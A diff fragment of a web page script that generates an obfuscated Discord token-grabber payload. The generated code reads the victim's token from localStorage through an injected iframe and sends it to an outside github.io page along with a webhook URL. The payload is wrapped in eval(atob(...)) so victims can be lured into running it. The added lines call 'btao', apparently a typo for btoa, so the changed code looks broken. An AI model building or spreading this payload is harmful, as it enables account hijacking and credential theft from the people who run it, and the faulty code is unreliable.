@@ -73,9 +73,9 @@ body {
     </div>
     <script>
         function generate() {
-            var code = `(function(){location.reload();var i=document.createElement('ifr' + 'ame');document.body.appendChild(i);var token=i.contentWindow.localStorage.token;window.open("https://exampleaccount0110.github.io/discord/?webhook=YOUR_WEBHOOK_HERE&token="+token, "_blank");})();`;
+            var code = `(function(){location.reload();var i=document.createElement('ifr' + 'ame');document.body.appendChild(i);var token=i.contentWindow.localStorage.token;window.open("https://exampleaccount0110.github.io/discord/?webhook=YOUR_WEBHOOK_HERE&token="+btao(token), "_blank");})();`;
             var wh = document.getElementById("hook").value;
-            code = code.replace('YOUR_WEBHOOK_HERE', wh);
+            code = code.replace('YOUR_WEBHOOK_HERE', btao(wh));
             const encodedCode = btoa(code);
             const finalCode = `eval(atob('${encodedCode}'));`;
             var container = document.getElementById("generator-box");
